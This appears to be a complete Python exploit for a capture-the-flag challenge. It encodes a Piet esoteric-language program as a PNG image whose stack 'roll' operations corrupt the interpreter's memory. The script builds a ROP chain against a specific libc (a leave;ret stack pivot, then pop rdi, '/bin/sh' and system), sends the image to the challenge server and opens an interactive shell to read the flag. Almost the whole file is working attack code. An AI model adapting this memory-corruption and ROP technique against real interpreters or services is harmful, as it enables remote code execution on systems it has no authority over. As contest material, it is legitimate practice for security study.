import io
from PIL import Image
from pwn import *

INSTRUCTIONS = [
    ['nop', 'push', 'pop'],
    ['add', 'sub', 'mul'],
    ['div', 'mod', 'not'],
    ['greater', 'pointer', 'switch'],
    ['dup', 'roll', 'nuh'],
    ['nuh', 'nuh', 'nuh'],
]
instruction_map = {}
for dh, row in enumerate(INSTRUCTIONS):
    for dl, cmd in enumerate(row):
        instruction_map[cmd] = dl % 3, dh

img_dict = {}
l, h = 0, 0
r, c = 0, 0
dr, dc = 0, 1
prog_counter = 0
img_dict[r, c] = l, h


def exec(cmds):
    global l, h, r, c, dr, dc, prog_counter
    for cmd in cmds.split():
        dl, dh = instruction_map[cmd]
        l, h = (l + dl) % 3, (h + dh) % 6
        img_dict[r := r + dr, c := c + dc] = l, h
        prog_counter += 1


def roll(depth, num_forwards):
    push(depth)
    push(num_forwards)
    exec('roll')


def push(n):
    global l, h, r, c, dr, dc
    if n == 0:
        exec('push not')
    elif n <= 300:
        for _ in range(n - 1):
            img_dict[r := r + dr, c := c + dc] = l, h
        exec('push')
    else:
        push(0)
        for i in range(32):
            push(2)
            exec('mul')
            if (n >> (31 - i)) % 2:
                push(1)
                exec('add')


def dup_second():
    # push a copy of the second value on the stack
    push(2)
    push(1)
    exec('roll')
    exec('dup')
    push(3)
    push(1)
    exec('roll')


def dup_u64(diff=0):
    # push a copy of the top 2 u32s on the stack, added by diff
    dup_second()
    if diff > 0:
        push(diff)
        exec('add')
    elif diff < 0:
        push(-diff)
        exec('sub')
    dup_second()


libc = ELF(libcdb.search_by_build_id('90ebd03ae9d9f42b23b4eb82fdf70352cf744198'))  # libc 2.43-2ubuntu2
rop = ROP([libc])
STDOUT = libc.symbols['_IO_2_1_stdout_']
RET = rop.find_gadget(['ret']).address
RDI_RET = rop.find_gadget(['pop rdi', 'ret']).address
BIN_SH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.symbols['system']
STACK_PIVOT = rop.find_gadget(['leave', 'ret']).address

# set stack_depth to 266 (top of stack points to dimensions of image)
push(266)
roll(2, 1)
exec('pop')
push(6)
push(1)

# change CC from LEFT (3) to RIGHT (1) and change DP from RIGHT (1) to DOWN (2)
dr, dc = 1, 0

# shifts CC -> DP (RIGHT=1), DP -> ROW (DOWN=2), ROW -> COL (1), and 266 -> stack_depth
exec('roll')
for r, c in ((2, 1), (1, 1), (1, 2), (1, 3), (1, 4), (2, 4), (2, 5)):
    img_dict[r, c] = l, h
dr, dc = 0, 1

# roll(40, 20) = dimensions of image, which sets top = stack[262]
exec('roll')

# move top = stack[250], which contains STDOUT
for _ in range(12):
    exec('pop')

# roll STDOUT down to stack[244]
roll(8, 2)
for _ in range(6):
    exec('pop')

# set stack[246] = new rip = STACK_PIVOT
dup_u64(diff=STACK_PIVOT - STDOUT)

roll(8, 6)

# set stack[248] = new rbp = stack[244]
dup_u64(diff=-0x430 + 246 * 4)

roll(6, 2)
for _ in range(2):
    exec('pop')
roll(8, 4)

# now top = stack[246], and stack[240] = new rbp, stack[242] = new rip
# pop down to top -> stack[226], which contains STDOUT
for _ in range(20):
    exec('pop')

# write ROP chain
dup_u64(diff=RDI_RET - STDOUT)
dup_u64(diff=BIN_SH - RDI_RET)
dup_u64(diff=SYSTEM - BIN_SH)

# now top = stack[232]
# pop down back to start
for _ in range(234):
    exec('pop')

##############################################################################
# redo the same thing to rotate new rbp and new rip to their correct locations
##############################################################################

# set stack_depth to 266 (top of stack points to dimensions of image)
push(266)
push(2)
push(1)
exec('roll pop')
push(6)
push(1)

# change CC from UP (0) to RIGHT (1)
push(1)
exec('switch')

# change CC from LEFT (3) to RIGHT (1) and change DP from RIGHT (1) to DOWN (2)
dr, dc = 1, 0

# shifts CC -> DP (RIGHT=1), DP -> ROW (DOWN=2), ROW -> COL (3), and 266 -> stack_depth
exec('roll')
for r, c in ((2, 3), (3, 3), (4, 3), (4, 4)):
    img_dict[r, c] = l, h
dr, dc = 0, 1

# roll(40, 20) = dimensions of image
exec('roll')

# exit sequence to force program end (ends at Z)
#
# -> ..XY Z
#       YYZ
#         Z
img_dict[(r + 1, c)] = img_dict[(r + 1, c + 1)] = l, h
c += 1
exec('switch')
img_dict[(r + 1, c)] = img_dict[(r + 2, c)] = l, h
print('Program state', r, c, prog_counter)

# Ensure dimensions of image are good numbers to use for roll (height is depth, width % height is n)
height = 40
width = max(c for r, c in img_dict.keys()) + 1
while width % height != 20:
    width += 1
img = Image.new("RGB", (width, height))
COLOR_MAP = {
    (0, 0): (0xC0, 0x00, 0x00), (0, 1): (0xC0, 0xC0, 0x00), (0, 2): (0x00, 0xC0, 0x00),
    (0, 3): (0x00, 0xC0, 0xC0), (0, 4): (0x00, 0x00, 0xC0), (0, 5): (0xC0, 0x00, 0xC0),
    (1, 0): (0xFF, 0x00, 0x00), (1, 1): (0xFF, 0xFF, 0x00), (1, 2): (0x00, 0xFF, 0x00),
    (1, 3): (0x00, 0xFF, 0xFF), (1, 4): (0x00, 0x00, 0xFF), (1, 5): (0xFF, 0x00, 0xFF),
    (2, 0): (0xFF, 0xC0, 0xC0), (2, 1): (0xFF, 0xFF, 0xC0), (2, 2): (0xC0, 0xFF, 0xC0),
    (2, 3): (0xC0, 0xFF, 0xFF), (2, 4): (0xC0, 0xC0, 0xFF), (2, 5): (0xFF, 0xC0, 0xFF),
}
for (r, c), color in img_dict.items():
    img.putpixel((c, r), COLOR_MAP[color])
png = io.BytesIO()
img.save(png, format='png')
# img.save('output.png', format='png')
print(f'Constructed Piet image: {height} x {width}')

io = remote('piet-2.instances.ctf.l3ak.team', 1337, ssl=True)
io.send(png.getvalue())

io.clean(timeout=1)
io.sendline(b'cat flag.txt')
io.interactive()
